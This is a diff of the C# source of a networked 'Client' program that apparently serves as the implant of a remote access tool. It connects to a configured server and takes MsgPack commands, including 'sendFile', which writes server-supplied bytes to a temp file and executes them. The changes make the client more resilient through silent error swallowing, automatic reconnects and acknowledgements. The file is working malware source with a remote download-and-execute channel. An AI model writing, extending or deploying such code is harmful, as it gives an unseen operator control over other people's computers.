@@ -23,7 +23,7 @@ namespace Client
     {
         public static readonly string IP = "127.0.0.1";
         public static readonly int Port = 8080;
-        public static readonly string Version = "0.2";
+        public static readonly string Version = "0.2.1";
     }
 
     class Program
@@ -77,15 +77,20 @@ namespace Client
         public static void Reconnect()
         {
             if (Client.Connected) return;
+
             Tick?.Dispose();
 
-            if (Client != null)
+            try
             {
-                Client.Close();
-                Client.Dispose();
-            }
+                if (Client != null)
+                {
+                    Client.Close();
+                    Client.Dispose();
+                }
 
-            MS?.Dispose();
+                MS?.Dispose();
+            }
+            catch { }
 
             InitializeClient();
         }
@@ -106,6 +111,7 @@ namespace Client
                 if (Client.Connected == false)
                 {
                     Reconnect();
+                    return;
                 }
 
                 int Recevied = Client.EndReceive(ar);
@@ -128,7 +134,6 @@ namespace Client
                         }
                         else
                         {
-
                             MS.Write(Buffer, 0, Buffer.Length);
                         }
                     }
@@ -144,13 +149,17 @@ namespace Client
                             Buffersize = 0;
                             BufferRecevied = false;
                         }
+                        else
+                        {
+                            Buffer = new byte[Buffersize - MS.Length];
+                        }
                     }
+                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
                     Reconnect();
                 }
-                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
@@ -160,49 +169,65 @@ namespace Client
 
         public static void Read(object Data)
         {
-            MsgPack unpack_msgpack = new MsgPack();
-            unpack_msgpack.DecodeFromBytes((byte[])Data);
-            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
+            try
             {
-                case "sendMessage":
-                    {
-                        MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
-                    }
-                    break;
-
-                case "Ping":
-                    {
-                        Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
-                    }
-                    break;
-
-                case "sendFile":
-                    {
-                        string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
-                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
-                        Process.Start(FullPath);
-                    }
-                    break;
-
-                case "closeConnection":
-                    {
-                        try
+                Received();
+                MsgPack unpack_msgpack = new MsgPack();
+                unpack_msgpack.DecodeFromBytes((byte[])Data);
+                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
+                {
+                    case "sendMessage":
                         {
-                            Client.Shutdown(SocketShutdown.Both);
+                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                         }
-                        catch { }
-                        Environment.Exit(0);
-                    }
-                    break;
+                        break;
+
+                    case "Ping":
+                        {
+                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                        }
+                        break;
+
+                    case "sendFile":
+                        {
+                            string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
+                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
+                            Process.Start(FullPath);
+                        }
+                        break;
+
+                    case "closeConnection":
+                        {
+                            try
+                            {
+                                Client.Shutdown(SocketShutdown.Both);
+                            }
+                            catch { }
+                            Environment.Exit(0);
+                        }
+                        break;
+                }
             }
+            catch { }
+        }
+
+        private static void Received()
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Received";
+            BeginSend(msgpack.Encode2Bytes());
         }
 
         public static void Ping(object obj)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
-            BeginSend(msgpack.Encode2Bytes());
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
+                BeginSend(msgpack.Encode2Bytes());
+            }
+            catch { }
         }
 
         public static void BeginSend(byte[] Msgs)
@@ -219,7 +244,7 @@ namespace Client
                         MS.Write(buffer, 0, buffer.Length);
 
                         Client.Poll(-1, SelectMode.SelectWrite);
-                        Client.BeginSend(MS.ToArray(), 0, Convert.ToInt32(MS.Length), SocketFlags.None, EndSend, null);
+                        Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
                     }
                 }
                 catch
